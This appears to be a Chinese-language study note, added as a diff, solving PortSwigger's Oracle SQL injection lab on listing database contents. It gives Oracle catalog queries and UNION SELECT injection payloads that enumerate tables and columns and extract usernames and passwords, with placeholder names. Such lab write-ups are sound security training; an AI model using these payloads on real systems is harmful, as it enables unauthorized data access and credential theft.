@@ -1,0 +1,28 @@
+靶场地址: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle
+
+=====新知识1=====
+关于Oracle的查询命令:
+查询表名:   SELECT table_name FROM all_tables
+查询列名:   SELECT column_name FROM all_tab_columns WHERE table_name='emmm'
+
+###
+进入靶场
+连 5个 NULL都不行   -> 图1
+果断尝试 FROM+DUAL
+试出来是两个字符串位置的 Oracle数据库 -> 图2
+
+###
+开始注入: '+UNION+SELECT+table_name,NULL+FROM+all_tables--+
+搜索 users,寻找可疑表单
+
+###
+去找列的名称,判断这个表单是不是我要的东西
+'+UNION+SELECT+column_name+||+'~~~~~',NULL+FROM+all_tab_columns+WHERE+table_name='可疑表单'--+
+=>
+搜索栏里面直接搜 '~~~~~'    -> 图5,图6
+这很小技巧了
+
+###
+去找账密
+UNION+SELECT+账,密+FROM+'可疑表单'--+  -> 图7,图8
+solved
